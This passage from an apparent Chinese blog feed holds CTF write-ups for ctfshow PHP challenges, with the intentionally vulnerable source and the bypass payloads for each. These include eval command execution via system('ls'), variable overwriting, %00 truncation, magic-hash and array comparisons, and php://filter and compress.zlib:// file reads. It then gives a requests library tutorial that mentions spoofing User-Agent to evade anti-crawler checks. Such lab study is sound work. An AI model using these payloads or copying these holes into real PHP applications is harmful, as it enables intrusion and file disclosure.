class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 106.v1和v2不同 用数组绕过 ?v2[]=1post：v1[]=2sha1() 函数无法处理数组，如果传入的为数组，会返回 NULL ，两个数组经过加密后得到的都是 NULL ，也就是相等的。sha1 加密后以0e开头，PHP 会当作科学计数法来处理，也就是 0 的 n 次方，得到的值比较的时候都相同。10932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e36977786278517984959260394024281014729<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 105.这是一个变量覆盖问题，get传参的名不能为error，post传的值不能为flag，?suces=flag 这个将$flag的值传给了$suces 第一次覆盖 post: error=suces 这个把$suces的值赋值给$error 第二次覆盖 error的值变成了flag 但没有flag这个名 所以第三个不成立<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 107.parse_str 函数将字符串 $v1 解析为变量并存储到数组 $v2 中。$v1 是一个包含查询字符串的变量，例如："flag=123&name=myon"。解析后的结果将存储在数组 $v2 中，例如：$v2 将包含 ['flag' => '123', 'name' => 'myon']。 post  v1=1?v3[]=1v3为一个数组 md5后为null当执行 `post v1=1` 时，`parse_str('1', $v2)` 会尝试将字符串 `1` 解析为键值对并存储到 `$v2` 数组中。但由于 `1` 不是合法的键值对格式（如 `key=value`），`$v2` 数组不会包含 `flag` 键。这意味着 `$v2['flag']` 是未定义的，在 PHP 中尝试访问未定义的数组元素会得到 `null`。v1=flag=202cb962ac59075b964b07152d234b70  202cb962ac59075b964b07152d234b70 是 123 的 md5 加密值 ?v3=123<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 108.要求c全为字母?c=a%00778 %00被还原为空字符，PHP 会把它当作字符串结束符，所以 `$c` 的值只会是 `a`，`778` 部分会被截断。然后反转，在取整数 等于877 0x36d 是16进制的877<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 109.v1 v2 都必须有字母，v2函数输出的结果作为参数传递给v1这个类  不知道flag在哪，首先设置v2=system('ls')echo 把后面的内容当成字符串输出， 后面如果是普通的类，没有定义_toString()函数，就会出现错误当 `echo` 后面跟着一个对象，并且这个对象所属的类定义了 `__toString()` 方法时，PHP 就会调用该方法，把内容当成字符串输出Exception类定义了tostring函数，所以v2的结果会被当成字符串输出?v1=Exception&v2=system('ls')<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 110.这里（）这些都被禁完了，getcwd函数返回当前目录，?v1=FilesystemIterator&v2=getcwd- **`FilesystemIterator`**：它是 PHP 内置的一个类，继承自 `DirectoryIterator`，能够让你轻松遍历文件系统中的目录和文件。通过实例化这个类并传入一个目录路径，你可以用循环来逐个访问该目录下的文件和子目录。- **`getcwd()`**：这是一个函数，返回当前 PHP 脚本所在的工作目录的绝对路径。比如，若你的 PHP 脚本位于 `/var/www/html` 目录下运行，`getcwd()` 就会返回 `/var/www/html`。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>### 111.类似于前面的变量覆盖，这里用的&是引用赋值，当你把一个变量通过引用赋值给另一个变量时，这两个变量会指向同一块内存地址，对其中一个变量的修改会影响到另一个变量把v2的结果传给了v1，并打印出来，这里让v2=GLOBALS 这是一个超全局变量数组，可以查看所有的变量，flag.php就被包含在里面，然后打印出来<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>### 112.这里用文件包含?file=php://filter//convert.iconv.UTF-8.UCS-4*/resource=flag.php 这是一个万能的base64被过滤，可以用爆破 看哪些还能用 UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; <span class="meta">&lt;?php</span></span><br></pre></td></tr></table></figure>过滤了很多 用压缩过滤器?file=compress.zlib://flag.php]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phptexing</title>
      <link href="/2025/04/23/phptexing/"/>
      <url>/2025/04/23/phptexing/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>requests库的学习</title>
      <link href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="request库通俗理解"><a href="#request库通俗理解" class="headerlink" title="request库通俗理解"></a>request库通俗理解</h3><h4 id="1-request库的作用"><a href="#1-request库的作用" class="headerlink" title="# 1.request库的作用"></a># 1.request库的作用</h4><p>requests库就像是一个能干的 “跑腿助手”。在现实生活中，如果你要去商店拿东西，可能会亲自走过去，但在网络世界里，有很多复杂的步骤和规则，而requests库就帮你处理这些复杂的事情，让你可以轻松地从网络上获取信息。</p><h4 id="2-GET-请求的含义"><a href="#2-GET-请求的含义" class="headerlink" title="*2. GET 请求的含义*"></a><em><strong>*2. GET 请求的含义*</strong></em></h4><p>GET 请求就相当于你跟商店店员说 “我想要某个东西”。在网络里，这个 “东西” 就是网页、图片、数据等资源。当你使用requests.get()方法并提供一个网址（比如<a href="https://www.baidu.com)时,就好像你告诉店员/">https://www.baidu.com）时，就好像你告诉店员</a> “我要这家店（对应网址的服务器）的东西”。</p><h4 id="3-发送请求和获取响应"><a href="#3-发送请求和获取响应" class="headerlink" title="*3. 发送请求和获取响应*"></a><em><strong>*3. 发送请求和获取响应*</strong></em></h4><p>当你执行r &#x3D; requests.get(‘<a href="https://www.baidu.com')这行代码时,就相当于你让/">https://www.baidu.com&#39;)这行代码时，就相当于你让</a> “跑腿助手”（requests库）去对应的 “商店”（服务器），并说出你想要的东西（发送 GET 请求）。然后 “跑腿助手” 会去那家 “商店”，把商店给的东西带回来。这个带回来的 “东西” 就存放在变量r里，它包含了服务器给你的各种信息，比如商品是不是成功拿到了（状态码）、商品具体是什么样子（响应内容）等。</p><h4 id="4-后续处理"><a href="#4-后续处理" class="headerlink" title="*4. 后续处理*"></a><em><strong>*4. 后续处理*</strong></em></h4><p>拿到 “东西” 后，你就可以看看这个 “东西” 怎么样。在代码里，你可以通过r.status_code查看请求是否成功（就像看看店员是不是把你要的东西给你了），通过r.text查看具体的内容（就像看看拿到的东西长啥样）。</p><p> 举个例子，假如你想要看某个新闻网站上的新闻，你就可以让requests这个 “跑腿助手” 去对应的新闻网站 “商店”，把新闻页面 “拿” 回来，然后你就能在自己的程序里查看这些新闻内容了。</p><p>用get请求去访问一个网站</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入requests库</span></span><br><span class="line">import requests</span><br><span class="line"><span class="comment">#发送一个get请求并得到响应</span></span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="comment">#查看响应对象的类型</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">type</span>(r))</span><br><span class="line"><span class="comment">#查看响应状态码</span></span><br><span class="line"><span class="keyword">print</span>(r.status_code)</span><br><span class="line"><span class="comment">#查看响应内容的类型</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">type</span>(r.text))</span><br><span class="line"><span class="comment">#查看响应的内容</span></span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"><span class="comment">#查看cookies</span></span><br><span class="line"><span class="keyword">print</span>(r.cookies)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要添加请求参数，比如添加两个请求参数，其中name值是germey，age值是20</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;age&#x27;</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>,params=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params=data` 是将之前定义的 `data` 字典作为查询参数添加到请求的 URL 中。也就是说，最终发送的请求 URL 会变成 `http://httpbin.org/get?name=germey&amp;age=22</span><br></pre></td></tr></table></figure><h3 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h3><h4 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h4><p><code>User-Agent</code> 字符串通常由多个部分组成，不同类型的客户端其格式会有所差异，但大致包含以下几类信息：</p><ul><li><strong>浏览器信息</strong>：如浏览器名称和版本号。例如 <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</code> ，这里表明浏览器是 Chrome 114 版本。</li><li><strong>操作系统信息</strong>：显示客户端使用的操作系统及其版本。上述示例中的 <code>Windows NT 10.0</code> 就表示使用的是 Windows 10 操作系统。</li><li><strong>渲染引擎信息</strong>：像 <code>AppleWebKit/537.36</code> 体现了使用的是 WebKit 渲染引擎及其版本。</li></ul><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><h4 id="1-服务器适配"><a href="#1-服务器适配" class="headerlink" title="1. 服务器适配"></a>1. 服务器适配</h4><p>服务器可以根据 <code>User-Agent</code> 判断客户端类型，然后返回适合该客户端的内容。比如，对于手机浏览器，服务器可以返回移动端适配的页面，提供更好的浏览体验；对于搜索引擎爬虫，服务器可以返回适合被索引的内容。</p><h4 id="2-统计分析"><a href="#2-统计分析" class="headerlink" title="2. 统计分析"></a>2. 统计分析</h4><p>网站管理员可以通过分析 <code>User-Agent</code> 数据，了解访问者使用的设备和浏览器情况，为网站的优化和推广提供数据支持。例如，如果发现大部分用户使用的是某一款特定浏览器，就可以针对该浏览器进行重点测试和优化。</p><h4 id="3-反爬虫和安全防护"><a href="#3-反爬虫和安全防护" class="headerlink" title="3. 反爬虫和安全防护"></a>3. 反爬虫和安全防护</h4><p>部分网站会依据 <code>User-Agent</code> 来识别是否为正常的浏览器访问。如果 <code>User-Agent</code> 显示为明显的爬虫程序，网站可能会采取限制访问、封禁 IP 等措施。同时，异常的 <code>User-Agent</code> 也可能被视为潜在的安全威胁。</p><p>可以用request库 改user-agent 让服务器误认为是正常的浏览器访问</p><h3 id="常见的请求头信息"><a href="#常见的请求头信息" class="headerlink" 